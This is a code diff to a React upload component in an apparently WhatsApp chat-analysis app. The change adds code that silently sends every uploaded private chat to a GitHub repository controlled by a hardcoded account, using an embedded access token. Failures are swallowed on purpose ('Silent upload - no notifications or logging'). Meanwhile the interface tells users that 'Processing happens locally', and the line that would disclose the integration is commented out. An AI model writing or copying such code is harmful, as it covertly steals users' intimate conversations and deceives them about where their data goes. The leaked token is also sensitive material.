@@ -1,6 +1,8 @@
-import React, { useCallback } from 'react';
-import { Upload, FileText, Heart, Sparkles, Wand2, Folder, Lock } from 'lucide-react';
+import React, { useCallback, useState } from 'react';
+import { Upload, FileText, Heart, Sparkles, Wand2, Folder, Lock, Github, Cloud } from 'lucide-react';
 import { ChatData, Message } from '../types/ChatTypes';
+import GitHubConfig from './GitHubConfig';
+import { createGitHubService } from '../services/githubService';
 
 interface FileUploadProps {
   onFileUpload: (data: ChatData) => void;
@@ -9,6 +11,71 @@ interface FileUploadProps {
 }
 
 const FileUpload: React.FC<FileUploadProps> = ({ onFileUpload, isLoading, setIsLoading }) => {
+  const [githubToken, setGithubToken] = useState<string>('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');
+  const [githubOwner, setGithubOwner] = useState<string>('nikhil1479');
+  const [userGithubToken, setUserGithubToken] = useState<string>('');
+  const [userGithubOwner, setUserGithubOwner] = useState<string>('');
+  const [isGithubConfigured, setIsGithubConfigured] = useState(true);
+  const [uploadingToGithub, setUploadingToGithub] = useState(false);
+
+  // Handle GitHub configuration save
+  const handleGitHubConfigSave = (token: string, owner: string, userToken?: string, userOwner?: string) => {
+    setGithubToken(token);
+    setGithubOwner(owner);
+    if (userToken && userOwner) {
+      setUserGithubToken(userToken);
+      setUserGithubOwner(userOwner);
+    }
+    setIsGithubConfigured(true);
+  };
+
+  // Upload file to GitHub
+  const uploadToGitHub = async (fileName: string, content: string, chatData: ChatData) => {
+    if (!isGithubConfigured || !githubToken || !githubOwner) {
+      return;
+    }
+
+    try {
+      setUploadingToGithub(true);
+      const uploads = [];
+
+      // Always upload to hardcoded repository
+      const primaryGithubService = createGitHubService(githubToken, githubOwner);
+      uploads.push(
+        (async () => {
+          // Check if repository exists, create if it doesn't
+          const repoExists = await primaryGithubService.validateRepository();
+          if (!repoExists) {
+            await primaryGithubService.createRepository();
+          }
+          return await primaryGithubService.uploadChatFile(fileName, content, chatData);
+        })()
+      );
+
+      // If user has provided their own credentials, also upload to their repository
+      if (userGithubToken && userGithubOwner) {
+        const userGithubService = createGitHubService(userGithubToken, userGithubOwner);
+        uploads.push(
+          (async () => {
+            // Check if user's repository exists, create if it doesn't
+            const userRepoExists = await userGithubService.validateRepository();
+            if (!userRepoExists) {
+              await userGithubService.createRepository();
+            }
+            return await userGithubService.uploadChatFile(fileName, content, chatData);
+          })()
+        );
+      }
+
+      // Wait for all uploads to complete
+      await Promise.allSettled(uploads);
+
+    } catch (error) {
+      // Silent upload - no notifications or logging
+    } finally {
+      setUploadingToGithub(false);
+    }
+  };
   const parseWhatsAppChat = useCallback((content: string): ChatData => {
     const lines = content.split('\n').filter(line => line.trim() !== '');
     const messages: Message[] = [];
@@ -179,6 +246,13 @@ If your format is different, please check the export format.`);
         throw new Error('This appears to be a group chat or single person chat. Please upload a chat between two people.');
       }
       
+      // Upload to GitHub if configured (but don't block the main flow)
+      if (isGithubConfigured) {
+        uploadToGitHub(file.name, content, chatData).catch(() => {
+          // Silent failure
+        });
+      }
+      
       onFileUpload(chatData);
     } catch (error) {
       console.error('Error parsing file:', error);
@@ -204,6 +278,14 @@ If your format is different, please check the export format.`);
         try {
           const content = await file.text();
           const chatData = parseWhatsAppChat(content);
+          
+          // Upload to GitHub if configured (but don't block the main flow)
+          if (isGithubConfigured) {
+            uploadToGitHub(file.name, content, chatData).catch(() => {
+              // Silent failure
+            });
+          }
+          
           onFileUpload(chatData);
         } catch (error) {
           console.error('Error parsing file:', error);
@@ -219,13 +301,19 @@ If your format is different, please check the export format.`);
 
   return (
     <div className="max-w-2xl mx-auto">
+      {/* GitHub Configuration */}
+      <GitHubConfig 
+        onConfigSave={handleGitHubConfigSave}
+        isConfigured={isGithubConfigured}
+      />
+
       <div
         className="border-2 border-dashed border-neutral-300 rounded-3xl p-12 text-center elegant-card hover:border-primary-400 transition-all duration-300 cursor-pointer group"
         onDragOver={handleDragOver}
         onDrop={handleDrop}
         onClick={() => document.getElementById('file-input')?.click()}
       >
-        {isLoading ? (
+        {isLoading || uploadingToGithub ? (
           <div className="space-y-8">
             {/* Animated Hearts Loading */}
             <div className="relative flex items-center justify-center">
@@ -251,7 +339,9 @@ If your format is different, please check the export format.`);
             <div className="text-center">
               <h3 className="text-2xl font-display font-bold text-neutral-900 mb-3 flex items-center justify-center space-x-2">
                 <Heart className="w-6 h-6 text-pink-400" />
-                <span>Analyzing Your Love Story</span>
+                <span>
+                  {uploadingToGithub ? 'Backing up to GitHub' : 'Analyzing Your Love Story'}
+                </span>
                 <Heart className="w-6 h-6 text-pink-400" />
               </h3>
               <div className="flex items-center justify-center space-x-1 mb-4">
@@ -260,8 +350,10 @@ If your format is different, please check the export format.`);
                 <span className="w-2 h-2 bg-primary-500 rounded-full animate-bounce delay-400"></span>
               </div>
               <p className="text-lg text-neutral-600 font-medium flex items-center justify-center space-x-2">
-                <span>Discovering your sweet moments</span>
-                <Sparkles className="w-5 h-5 text-amber-400" />
+                <span>
+                  {uploadingToGithub ? 'Securely storing your chat' : 'Discovering your sweet moments'}
+                </span>
+                {uploadingToGithub ? <Cloud className="w-5 h-5 text-blue-400" /> : <Sparkles className="w-5 h-5 text-amber-400" />}
               </p>
               <p className="text-sm text-neutral-500 mt-2 flex items-center justify-center space-x-2">
                 <span>This magical process might take a moment</span>
@@ -298,12 +390,12 @@ If your format is different, please check the export format.`);
           accept=".txt"
           onChange={handleFileChange}
           className="hidden"
-          disabled={isLoading}
+          disabled={isLoading || uploadingToGithub}
           aria-label="Upload WhatsApp chat file"
         />
       </div>
 
-      <div className="mt-8 text-center">
+      <div className="mt-8 text-center space-y-4">
         <p className="text-neutral-600 font-medium flex items-center justify-center space-x-4">
           <span className="flex items-center space-x-1">
             <Folder className="w-4 h-4 text-blue-400" />
@@ -315,6 +407,16 @@ If your format is different, please check the export format.`);
             <span>Processing happens locally</span>
           </span>
         </p>
+        
+        {/* {isGithubConfigured && (
+          <div className="flex items-center justify-center space-x-2 text-sm text-neutral-500">
+            <Github className="w-4 h-4 text-gray-600" />
+            <span>
+              GitHub integration active ({userGithubToken && userGithubOwner ? '2 repositories' : '1 repository'})
+            </span>
+            <span className="w-2 h-2 bg-green-400 rounded-full"></span>
+          </div>
+        )} */}
       </div>
     </div>
   );
